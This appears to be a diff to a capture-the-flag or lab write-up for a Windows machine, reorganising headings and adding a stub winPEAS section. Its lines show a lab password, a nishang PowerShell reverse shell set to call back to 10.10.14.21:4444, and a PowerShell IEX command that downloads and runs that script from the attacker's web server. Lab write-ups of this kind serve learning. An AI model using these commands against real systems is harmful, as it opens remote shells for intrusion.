@@ -161,13 +161,14 @@ Password: 4Cc3ssC0ntr0ller
   - Modify and upload `nishang` shell.
   - `/opt/nishang/Shells/Invoke-PowerShellTcp.ps1`.
 
-### Modify
+### Nishang
+#### Modify
 ```CSS
 ▶ Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.21 -Port 4444
 ```
   - Add the above line to the bottom of the nishang script.
 
-### Upload & Execute
+#### Upload & Execute
 ```CSS
 ▶ python -m http.server
 ```
@@ -178,3 +179,9 @@ Password: 4Cc3ssC0ntr0ller
 C:\Users\security\Desktop>powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.21:8000/Invoke-PowerShellTcp.ps1')"
 ```
 ![image](https://user-images.githubusercontent.com/83878909/234075465-eab8f656-1ad4-4cab-8efd-bcf1dd179517.png)
+
+#### winPEAS
+  - Upload `winPEASx64.exe`.
+```CSS
+▶ 
+```
